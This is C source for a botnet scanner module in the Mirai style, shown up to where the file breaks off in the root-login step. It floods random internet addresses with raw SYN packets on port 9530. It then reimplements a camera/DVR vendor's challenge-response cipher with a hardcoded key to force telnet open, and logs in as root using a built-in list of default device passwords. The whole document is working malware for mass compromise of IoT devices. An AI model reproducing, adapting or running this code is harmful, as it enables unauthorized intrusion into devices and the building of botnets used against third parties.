#ifdef SCANNER

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <string.h>

#include "scanner.h"
#include "rand.h"
#include "util.h"
#include "resolv.h"

int scanner_pid = -1, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

static void report_working(uint32_t, uint16_t, char *, char *);

unsigned char state[2048] = {0};
unsigned char datum[] = {0x20, 0x01, 0x02, 0x03, 0x04, 0x05, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x01, 0x0e, 0x04, 0x0d, 0x01, 0x02, 0x0f, 0x0b, 0x08, 0x03, 0x0a, 0x06, 0x0c, 0x05, 0x09, 0x00, 0x07, 0x00, 0x0f, 0x07, 0x04, 0x0e, 0x02, 0x0d, 0x01, 0x0a, 0x06, 0x0c, 0x0b, 0x09, 0x05, 0x03, 0x08, 0x04, 0x01, 0x0e, 0x08, 0x0d, 0x06, 0x02, 0x0b, 0x0f, 0x0c, 0x09, 0x07, 0x03, 0x0a, 0x05, 0x00, 0x0f, 0x0c, 0x08, 0x02, 0x04, 0x09, 0x01, 0x07, 0x05, 0x0b, 0x03, 0x0e, 0x0a, 0x00, 0x06, 0x0d, 0x0f, 0x01, 0x08, 0x0e, 0x06, 0x0b, 0x03, 0x04, 0x09, 0x07, 0x02, 0x0d, 0x0c, 0x00, 0x05, 0x0a, 0x03, 0x0d, 0x04, 0x07, 0x0f, 0x02, 0x08, 0x0e, 0x0c, 0x00, 0x01, 0x0a, 0x06, 0x09, 0x0b, 0x05, 0x00, 0x0e, 0x07, 0x0b, 0x0a, 0x04, 0x0d, 0x01, 0x05, 0x08, 0x0c, 0x06, 0x09, 0x03, 0x02, 0x0f, 0x0d, 0x08, 0x0a, 0x01, 0x03, 0x0f, 0x04, 0x02, 0x0b, 0x06, 0x07, 0x0c, 0x00, 0x05, 0x0e, 0x09, 0x0a, 0x00, 0x09, 0x0e, 0x06, 0x03, 0x0f, 0x05, 0x01, 0x0d, 0x0c, 0x07, 0x0b, 0x04, 0x02, 0x08, 0x0d, 0x07, 0x00, 0x09, 0x03, 0x04, 0x06, 0x0a, 0x02, 0x08, 0x05, 0x0e, 0x0c, 0x0b, 0x0f, 0x01, 0x0d, 0x06, 0x04, 0x09, 0x08, 0x0f, 0x03, 0x00, 0x0b, 0x01, 0x02, 0x0c, 0x05, 0x0a, 0x0e, 0x07, 0x01, 0x0a, 0x0d, 0x00, 0x06, 0x09, 0x08, 0x07, 0x04, 0x0f, 0x0e, 0x03, 0x0b, 0x05, 0x02, 0x0c, 0x07, 0x0d, 0x0e, 0x03, 0x00, 0x06, 0x09, 0x0a, 0x01, 0x02, 0x08, 0x05, 0x0b, 0x0c, 0x04, 0x0f, 0x0d, 0x08, 0x0b, 0x05, 0x06, 0x0f, 0x00, 0x03, 0x04, 0x07, 0x02, 0x0c, 0x01, 0x0a, 0x0e, 0x09, 0x0a, 0x06, 0x09, 0x00, 0x0c, 0x0b, 0x07, 0x0d, 0x0f, 0x01, 0x03, 0x0e, 0x05, 0x02, 0x08, 0x04, 0x03, 0x0f, 0x00, 0x06, 0x0a, 0x01, 0x0d, 0x08, 0x09, 0x04, 0x05, 0x0b, 0x0c, 0x07, 0x02, 0x0e, 0x02, 0x0c, 0x04, 0x01, 0x07, 0x0a, 0x0b, 0x06, 0x08, 0x05, 0x03, 0x0f, 0x0d, 0x00, 0x0e, 0x09, 0x0e, 0x0b, 0x02, 0x0c, 0x04, 0x07, 0x0d, 0x01, 0x05, 0x00, 0x0f, 0x0a, 0x03, 0x09, 0x08, 0x06, 0x04, 0x02, 0x01, 0x0b, 0x0a, 0x0d, 0x07, 0x08, 0x0f, 0x09, 0x0c, 0x05, 0x06, 0x03, 0x00, 0x0e, 0x0b, 0x08, 0x0c, 0x07, 0x01, 0x0e, 0x02, 0x0d, 0x06, 0x0f, 0x00, 0x09, 0x0a, 0x04, 0x05, 0x03, 0x0c, 0x01, 0x0a, 0x0f, 0x09, 0x02, 0x06, 0x08, 0x00, 0x0d, 0x03, 0x04, 0x0e, 0x07, 0x05, 0x0b, 0x0a, 0x0f, 0x04, 0x02, 0x07, 0x0c, 0x09, 0x05, 0x06, 0x01, 0x0d, 0x0e, 0x00, 0x0b, 0x03, 0x08, 0x09, 0x0e, 0x0f, 0x05, 0x02, 0x08, 0x0c, 0x03, 0x07, 0x00, 0x04, 0x0a, 0x01, 0x0d, 0x0b, 0x06, 0x04, 0x03, 0x02, 0x0c, 0x09, 0x05, 0x0f, 0x0a, 0x0b, 0x0e, 0x01, 0x07, 0x06, 0x00, 0x08, 0x0d, 0x04, 0x0b, 0x02, 0x0e, 0x0f, 0x00, 0x08, 0x0d, 0x03, 0x0c, 0x09, 0x07, 0x05, 0x0a, 0x06, 0x01, 0x0d, 0x00, 0x0b, 0x07, 0x04, 0x09, 0x01, 0x0a, 0x0e, 0x03, 0x05, 0x0c, 0x02, 0x0f, 0x08, 0x06, 0x01, 0x04, 0x0b, 0x0d, 0x0c, 0x03, 0x07, 0x0e, 0x0a, 0x0f, 0x06, 0x08, 0x00, 0x05, 0x09, 0x02, 0x06, 0x0b, 0x0d, 0x08, 0x01, 0x04, 0x0a, 0x07, 0x09, 0x05, 0x00, 0x0f, 0x0e, 0x02, 0x03, 0x0c, 0x0d, 0x02, 0x08, 0x04, 0x06, 0x0f, 0x0b, 0x01, 0x0a, 0x09, 0x03, 0x0e, 0x05, 0x00, 0x0c, 0x07, 0x01, 0x0f, 0x0d, 0x08, 0x0a, 0x03, 0x07, 0x04, 0x0c, 0x05, 0x06, 0x0b, 0x00, 0x0e, 0x09, 0x02, 0x07, 0x0b, 0x04, 0x01, 0x09, 0x0c, 0x0e, 0x02, 0x00, 0x06, 0x0a, 0x0d, 0x0f, 0x03, 0x05, 0x08, 0x02, 0x01, 0x0e, 0x07, 0x04, 0x0a, 0x08, 0x0d, 0x0f, 0x0c, 0x09, 0x00, 0x03, 0x05, 0x06, 0x0b, 0x10, 0x07, 0x14, 0x15, 0x1d, 0x0c, 0x1c, 0x11, 0x01, 0x0f, 0x17, 0x1a, 0x05, 0x12, 0x1f, 0x0a, 0x02, 0x08, 0x18, 0x0e, 0x20, 0x1b, 0x03, 0x09, 0x13, 0x0d, 0x1e, 0x06, 0x16, 0x0b, 0x04, 0x19, 0x3a, 0x32, 0x2a, 0x22, 0x1a, 0x12, 0x0a, 0x02, 0x3c, 0x34, 0x2c, 0x24, 0x1c, 0x14, 0x0c, 0x04, 0x3e, 0x36, 0x2e, 0x26, 0x1e, 0x16, 0x0e, 0x06, 0x40, 0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01, 0x3b, 0x33, 0x2b, 0x23, 0x1b, 0x13, 0x0b, 0x03, 0x3d, 0x35, 0x2d, 0x25, 0x1d, 0x15, 0x0d, 0x05, 0x3f, 0x37, 0x2f, 0x27, 0x1f, 0x17, 0x0f, 0x07, 0xf4, 0x63, 0x01, 0x00, 0x28, 0x08, 0x30, 0x10, 0x38, 0x18, 0x40, 0x20, 0x27, 0x07, 0x2f, 0x0f, 0x37, 0x17, 0x3f, 0x1f, 0x26, 0x06, 0x2e, 0x0e, 0x36, 0x16, 0x3e, 0x1e, 0x25, 0x05, 0x2d, 0x0d, 0x35, 0x15, 0x3d, 0x1d, 0x24, 0x04, 0x2c, 0x0c, 0x34, 0x14, 0x3c, 0x1c, 0x23, 0x03, 0x2b, 0x0b, 0x33, 0x13, 0x3b, 0x1b, 0x22, 0x02, 0x2a, 0x0a, 0x32, 0x12, 0x3a, 0x1a, 0x21, 0x01, 0x29, 0x09, 0x31, 0x11, 0x39, 0x19, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01, 0x3a, 0x32, 0x2a, 0x22, 0x1a, 0x12, 0x0a, 0x02, 0x3b, 0x33, 0x2b, 0x23, 0x1b, 0x13, 0x0b, 0x03, 0x3c, 0x34, 0x2c, 0x24, 0x3f, 0x37, 0x2f, 0x27, 0x1f, 0x17, 0x0f, 0x07, 0x3e, 0x36, 0x2e, 0x26, 0x1e, 0x16, 0x0e, 0x06, 0x3d, 0x35, 0x2d, 0x25, 0x1d, 0x15, 0x0d, 0x05, 0x1c, 0x14, 0x0c, 0x04, 0x50, 0x64, 0x01, 0x00, 0x01, 0x01, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x01, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x01, 0x0e, 0x11, 0x0b, 0x18, 0x01, 0x05, 0x03, 0x1c, 0x0f, 0x06, 0x15, 0x0a, 0x17, 0x13, 0x0c, 0x04, 0x1a, 0x08, 0x10, 0x07, 0x1b, 0x14, 0x0d, 0x02, 0x29, 0x34, 0x1f, 0x25, 0x2f, 0x37, 0x1e, 0x28, 0x33, 0x2d, 0x21, 0x30, 0x2c, 0x31, 0x27, 0x38, 0x22, 0x35, 0x2e, 0x2a, 0x32, 0x24, 0x1d, 0x20};

char *password_list[] = {"xc3511", "xmhdipc", "klv123", "123456", "jvbzd", "hi3518", "tsgoingon"};

void init_cipher_offset_vector(unsigned char *dst, unsigned char *src, int size)
{
    int i;

    i = 0;
    while (i < size)
    {
        dst[i] = (unsigned char)((int)(unsigned int)src[i >> 3] >> (i & 7U)) & 1;
        i = i + 1;
    }

    return;
}

void apply_cipher_offset_vector(unsigned char *dst, unsigned char *src, unsigned char *offset_vector, size_t size)
{
    int i;

    i = 0;
    while (i < (int)size)
    {
        state[i] = src[(unsigned int)offset_vector[i] - 1];
        i = i + 1;
    }

    util_memcpy(dst, state, size);
    return;
}

void cipher_memcpy_shuffle(void *dst, size_t size)
{
    util_memcpy(state, dst, size);
    util_memcpy(dst, (void *)(dst + size), 0x1c - size);
    util_memcpy((void *)(dst + (0x1c - size)), state, size);
    return;
}

void init_cipher_state(void *dst, void *src)
{
    unsigned char current_byte;
    int i;

    init_cipher_offset_vector(state + 0x190, (unsigned char *)src, 0x40);
    apply_cipher_offset_vector(state + 0x190, state + 0x190, datum + 0x2d4, 0x38);
    i = 0;

    do {
        current_byte = (datum + 0x310)[i];
        i = i + 1;
        cipher_memcpy_shuffle(state + 0x190, (unsigned int)current_byte);
        cipher_memcpy_shuffle(state + 0x190 + 0x1c, (unsigned int)current_byte);
        apply_cipher_offset_vector((unsigned char *)dst, state + 0x190, datum + 0x320, 0x30);
        dst = (unsigned char *)dst + 0x30;
    } while (i != 0x10);

    return;
}

void cipher_xor(unsigned char *data, unsigned char *key, int size)
{
    int i = 0;

    while (i < size)
    {
        data[i] = key[i] ^ data[i];
        i = i + 1;
    }
    return;
}

void prepare_key(void *key, size_t key_size)
{
    size_t __n;

    util_memset(state + 0x1d0, 0, 0x10);
    __n = key_size;
    if (0xf < (int)key_size)
        __n = 0x10;

    util_memcpy(state + 0x1d0, key,__n);
    init_cipher_state(state + 0x1e0, state + 0x1d0);
    if (8 < (int)key_size)
        init_cipher_state(state + 0x4e0, state + 0x1d8);

    *(state + 0x7e0) = 8 < (int)key_size;
    return;
}

void cipher_shuffle(unsigned char *dst, unsigned char *src)
{
    unsigned char *caretPtr;
    int iVar1;
    unsigned char *ptr;
    int i;

    apply_cipher_offset_vector(state + 0x100, dst, datum, 0x30);
    cipher_xor(state + 0x100, src, 0x30);
    ptr = state + 0x100;
    i = 0;

    do {
        iVar1 = i + (unsigned int)ptr[5] + (unsigned int)*ptr * 2;
        caretPtr = dst + i;
        i = i + 4;
        init_cipher_offset_vector(caretPtr, datum + 0x30 + (unsigned int)ptr[2] * 4 + (unsigned int)ptr[1] * 8 + (unsigned int)ptr[4] + (unsigned int)ptr[3] * 2 + iVar1 * 0x10, 4);
        ptr = ptr + 6;
    } while (i != 0x20);

    apply_cipher_offset_vector(dst, dst, datum + 0x230, 0x20);
    return;
}

void cipher_box(unsigned char *result, unsigned char *data, unsigned char *offset_vector, int direction)
{
  unsigned int i;
  unsigned char *backward_ov_ptr;
  unsigned char *forward_ov_ptr;
  int iVar3;

  init_cipher_offset_vector(state + 0x130, data, 0x40);
  apply_cipher_offset_vector(state + 0x130, state + 0x130, datum + 0x250, 0x40);

  if (direction == 0)
  {
      forward_ov_ptr = offset_vector + 0x300;

      do {
          util_memcpy(state + 0x170, state + 0x150, 0x20);
          cipher_shuffle(state + 0x150, offset_vector);
          cipher_xor(state + 0x150, state + 0x130, 0x20);
          util_memcpy(state + 0x130, state + 0x170, 0x20);
          offset_vector = offset_vector + 0x30;
        } while (offset_vector != forward_ov_ptr);
    }
    else
    {
        backward_ov_ptr = offset_vector + 0x2d0;

        do {
            util_memcpy(state + 0x170, state + 0x130, 0x20);
            cipher_shuffle(state + 0x130, backward_ov_ptr);
            cipher_xor(state + 0x130, state + 0x150, 0x20);
            backward_ov_ptr -= 0x30;
            util_memcpy(state + 0x150, state + 0x170, 0x20);
        } while (backward_ov_ptr != offset_vector + -0x30);
    }

    apply_cipher_offset_vector(state + 0x130, state + 0x130, datum + 0x294, 0x40);
    util_memset(result, 0, 8);

    i = 0;

    do {
        result[i >> 3] = result[i >> 3] | *(char *)(state + 0x130 + i) << (i & 7);
        i = i + 1;
    } while (i != 0x40);

    return;
}

int __ecrypt(char *result, char *data, unsigned int data_len, char *key, unsigned int key_len)
{
    unsigned int short_key_iter;
    int curBlockNumber;
    int blockCount;

    if (((result != (char *)0x0 && data != (char *)0x0) && (curBlockNumber = 0, key != (char *)0x0)) && ((data_len + 7 & 0xfffffff8) != 0))
    {
        prepare_key(key, key_len);
        blockCount = (int)(data_len + 7) >> 3;
        short_key_iter = *(state + 0x7e0);
        if (*(state + 0x7e0) == 0)
        {
            while ((int)short_key_iter < blockCount)
            {
                cipher_box((unsigned char *)result, (unsigned char *)data, state + 0x1e0, 1);
                short_key_iter = short_key_iter + 1;
                result = (char *)((unsigned char *)result + 8);
                data = (char *)((unsigned char *)data + 8);
            }
        }
        else
        {
            while (curBlockNumber < blockCount)
            {
                cipher_box((unsigned char *)result, (unsigned char *)data, state + 0x1e0,1);
                cipher_box((unsigned char *)result, (unsigned char *)result, state + 0x4e0,0);
                cipher_box((unsigned char *)result, (unsigned char *)result, state + 0x1e0,1);
                curBlockNumber = curBlockNumber + 1;
                result = (char *)((unsigned char *)result + 8);
                data = (char *)((unsigned char *)data + 8);
            }
        }

        return 0;
    }

    return -1;
}

int __encrypt(char *result, char *data, unsigned int data_len, char *key, unsigned int key_size)
{
    unsigned int uVar2;
    int currentBlockNumber;
    int blocksCount;

    if (((result != (char *)0x0 && data != (char *)0x0) && (currentBlockNumber = 0, key != (char *)0x0)) && ((data_len + 7 & 0xfffffff8) != 0))
    {
        prepare_key(key, key_size);
        blocksCount = (int)(data_len + 7) >> 3;
        uVar2 = *(state + 0x7e0);

        if (*(state + 0x7e0) == 0)
        {
            while ((int)uVar2 < blocksCount)
            {
                cipher_box((unsigned char *)result, (unsigned char *)data, state + 0x1e0, 0);
                uVar2 = uVar2 + 1;
                result = (char *)((unsigned char *)result + 8);
                data = (char *)((unsigned char *)data + 8);
            }
        }
        else
        {
            while (currentBlockNumber < blocksCount)
            {
                cipher_box((unsigned char *)result, (unsigned char *)data,state + 0x1e0, 0);
                cipher_box((unsigned char *)result, (unsigned char *)result,state + 0x4e0, 1);
                cipher_box((unsigned char *)result, (unsigned char *)result,state + 0x1e0, 0);
                currentBlockNumber = currentBlockNumber + 1;
                result = (char *)((unsigned char *)result + 8);
                data = (char *)((unsigned char *)data + 8);
            }
        }

        return 0;
    }

    return -1;
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

void tohex(unsigned char *in, size_t insz, char *out, size_t outsz)
{
    unsigned char *pin = in;
    const char *hex = "0123456789ABCDEF";
    char *pout = out;

    for(; pin < in+insz; pout +=3, pin++)
    {
        pout[0] = hex[(*pin >> 4) & 0xF];
        pout[1] = hex[ *pin & 0xF];
        pout[2] = ':';

        if (pout + 3 - out > outsz)
            break;
    }

    pout[-1] = 0;
}

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

ssize_t send_string(int sockfd, char *str, size_t len)
{
    if (len > 0xFE)
        return -1;

    char buf[len + 1];
    buf[0] = len + 1;
    util_memcpy(buf + 1, str, len);
    return send(sockfd, buf, len + 1, 0);
}

void scanner_init(void)
{
    int i, last_dlr;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    sleep(1);
    uint32_t LOCAL_ADDR = util_local_addr();
    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }

    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    int ports[] = {9530};
    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(ports[rand_next() % (sizeof(ports) / sizeof(ports[0]))]);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    while (1)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                tcph->dest = htons(ports[rand_next() % (sizeof(ports) / sizeof(ports[0]))]);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (1)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(9530))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                if (conn->state > SC_HANDLE_IACS)
                {
                    if (++(conn->tries) == 7)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                        setup_connection(conn);
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = SC_CLOSED;
                    conn->tries = 0;
                }

                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    if (conn->dst_port == htons(9530))
                    {
                        conn->state = SC_DO_CHALLANGE;
                        conn->rdbuf_pos = 0;
                        send_string(conn->fd, "OpenTelnet:OpenOnce", sizeof("OpenTelnet:OpenOnce"));
#ifdef DEBUG
                        printf("[scanner] FD%d connected, open telnet payload sent\n", conn->fd);
#endif
                    }
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (1)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            if (conn->state > SC_HANDLE_IACS)
                            {
                                if (++(conn->tries) == 7)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                    setup_connection(conn);
                                }
                            }
                            else
                            {
                                close(conn->fd);
                                conn->fd = -1;
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (1)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_DO_CHALLANGE:
                            if ((consumed = consume_challange_resp(conn)) > 0)
                            {
                                char *seed = conn->rdbuf + 8;

                                util_memset(conn->challange_str, 0, sizeof(conn->challange_str));
                                util_strcpy(conn->challange_str, seed);
                                util_strcat(conn->challange_str, "2wj9fsa2");
#ifdef DEBUG
                                printf("[scanner] FD%d doing challange with seed %s\n", conn->fd, conn->challange_str);
#endif
                                char encryptedRandomSeed[PADDED(util_strlen(conn->challange_str))];
                                util_memset(encryptedRandomSeed, 0, sizeof(encryptedRandomSeed));
                                __encrypt(encryptedRandomSeed, seed, util_strlen(seed), conn->challange_str, util_strlen(conn->challange_str));
                                char rdbuf[1024];
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                memcpy(rdbuf, "randNum:", 8);
                                memcpy(rdbuf + 8, encryptedRandomSeed, PADDED(util_strlen(conn->challange_str)));
                                send_string(conn->fd, rdbuf, 8 + PADDED(util_strlen(conn->challange_str)));

                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                util_memset(encryptedRandomSeed, 0, sizeof(encryptedRandomSeed));
                                conn->state = SC_VERIFY_CHALLANGE;
                                seed = NULL;
                            }
                            break;
                        case SC_VERIFY_CHALLANGE:
                            if ((consumed = consume_verify_resp(conn)) > 0)
                            {
                                char rdbuf[1024];
                                util_memset(rdbuf, 0, sizeof(rdbuf));

                                char encryptedFinal[PADDED(16)];
                                __encrypt(encryptedFinal, "Telnet:OpenOnce", 16, conn->challange_str, util_strlen(conn->challange_str));
                                memcpy(rdbuf, "CMD:", 4);
                                memcpy(rdbuf + 4, encryptedFinal, sizeof(encryptedFinal));
#ifdef DEBUG
                                printf("[scanner] FD%d complete challange, sending command (%d)\n", conn->fd, util_strlen(conn->challange_str));
#endif
                                send_string(conn->fd, rdbuf, 4 + sizeof(encryptedFinal));
                                util_memset(rdbuf, 0, sizeof(rdbuf));
                                util_memset(encryptedFinal, 0, sizeof(encryptedFinal));
                                util_memset(conn->challange_str, 0, sizeof(conn->challange_str));
                                conn->state = SC_VERIFY_TELNET;
                            }
                            break;
                        case SC_VERIFY_TELNET:
                            if ((consumed = consume_telnet_resp(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d telnet has been opened on the device\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->dst_port = htons(23);
                                setup_connection(conn);
                                conn->state = SC_HANDLE_IACS;
                            }
                            break;
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                                conn->state = SC_WAITING_USERNAME;
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                                send(conn->fd, "root", 4, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
